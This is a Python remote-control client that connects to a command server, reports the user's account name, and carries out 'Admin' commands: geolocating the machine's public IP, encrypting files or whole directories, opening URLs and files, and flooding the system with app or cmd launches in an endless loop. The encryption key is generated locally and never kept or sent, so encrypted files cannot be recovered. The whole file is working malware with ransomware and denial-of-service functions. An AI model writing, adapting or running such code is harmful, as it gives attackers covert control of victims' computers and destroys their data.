import socket
import threading
import getpass
import os
import webbrowser
import requests
from cryptography.fernet import Fernet
from datetime import datetime, timedelta

IP = socket.gethostbyname(socket.gethostname())
PORT = 9999
key = None

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def mac_flood(time):
    loop_duration = time
    end_time = datetime.now() + timedelta(seconds=loop_duration)
    while datetime.now() < end_time:
        os.system('open -a Safari')
        os.system('open -a Music')
        os.system('open -a Notes')
        os.system('open -a Reminders')
        os.system('open -a Finder')
        os.system('open -a Terminal')

def generate_key():
    return Fernet.generate_key()

def decrypt_file(filename, key):
    fernet = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    decrypted_data = fernet.decrypt(file_data)

    with open(filename, "wb") as file:
        file.write(decrypted_data)

def decrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key)

def encrypt_file(filename, key):
    fernet = Fernet(key)

    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = fernet.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)

def encrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def perform_action(command, payload, admin_nickname):
    if command == "echo":
        result = payload
    elif command == "reverse":
        result = payload[::-1]

    elif command == "-locate_info":
            
        try:
            response = requests.get("https://api.ipify.org?format=json")
            usr_ip = response.json()['ip']
        except Exception as e:
            result=e

        try:
            response = requests.get(f"http://ip-api.com/json/{usr_ip}")
            data = response.json()

            if data["status"] == "success":
                result = (f"IP : {usr_ip}\nCountry : {data['country']}\nRegion : {data['regionName']}\nCity : {data['city']}\nLatitude : {data['lat']}\nLongtitude : {data['lon']}")

            else:
                result = ("Error: Unable to get location data.")

        except Exception as e:
            result = e

    elif command.startswith("-crypt"):
        key = generate_key()
        if os.path.isfile(payload):
            encrypt_file(payload, key)
        elif os.path.isdir(payload):
            encrypt_directory(payload, key)
        else:
            result = "Invalid file or directory path"
        result = "Encryption completed"
    elif command.startswith("-decrypt"):
        if key is None:
            result = "Decryption key not provided"
        if os.path.isfile(payload):
            decrypt_file(payload, key)
        elif os.path.isdir(payload):
            decrypt_directory(payload, key)
        else:
            result = "Invalid file or directory path"
        result = "Decryption completed"
    elif command.startswith("-open_url"):
        webbrowser.open(payload)
        result = ""
    elif command.startswith("-open_file"):
        os.startfile(payload)
        result = ""
    elif command == "-c_flood":
        while True:
            os.startfile("cmd")
        result = ""
    elif command == "-cwd":
        result = os.getcwd()
        
    elif command == '-m_flood':
        mac_flood(payload)
        result = "Flood Started"
    else:
        result = "Unknown command"

    send_result(result, admin_nickname)
    return ""
   
def receive_messages():
    while True:
        try:
            message = client.recv(1024).decode("utf-8")
            if message.startswith("Admin:"):
                admin_nickname, command_msg = message.split("Admin:", 1)
                command_msg = command_msg.strip()
                command, _, payload = command_msg.partition(" ")
                command = command.strip()
                payload = payload.strip()
                perform_action(command, payload, admin_nickname.strip())
        except:
            client.close()
            break

def send_result(result, admin_nickname):
    message = f"{admin_nickname}: {nickname}: {result}"
    client.send(message.encode("utf-8"))

def connect_to_server():
    global nickname
    try:
        client.connect((IP, PORT))
        message = client.recv(1024).decode('utf-8')
        if message == "ENTER NICKNAME:":
            nickname = input("Enter your nickname: ")
            client.send(nickname.encode('utf-8'))

        message = client.recv(1024).decode('utf-8')
        if message == "ENTER DEVICE ID:":
            device_id = getpass.getuser()
            client.send(device_id.encode('utf-8'))

        receive_thread = threading.Thread(target=receive_messages)
        receive_thread.start()
    except Exception as e:
        print(f"Error connecting to the server: {e}")
        client.close()

if __name__ == "__main__":
    connect_to_server()
